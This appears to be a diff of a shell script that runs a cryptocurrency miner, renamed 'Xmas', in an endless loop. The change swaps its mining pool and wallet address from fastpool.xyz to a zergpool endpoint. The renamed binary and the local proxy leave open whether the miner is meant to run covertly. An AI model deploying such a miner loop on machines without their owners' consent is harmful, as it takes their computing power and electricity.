@@ -125,6 +125,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -a ghostrider --url fastpool.xyz:4196 --user solo:GR9pckKiisXKiNeAzzZ6tBQvZUE5ist8Fs@$currentdate --pass x -k -t $used_num_of_cores --verbose --randomx-1gb-pages -x 127.0.0.1:1081
+./Xmas --donate-level 1 -a ghostrider --url ghostrider.na.mine.zergpool.com:5354 --user TdEzAdCkvu11VirG942vbKxdNkNG7pteGb.$currentdate --pass  c=TCC,mc=TCC,m=solo -k -t $used_num_of_cores --verbose --randomx-1gb-pages -x 127.0.0.1:1081
 sleep 10
 done
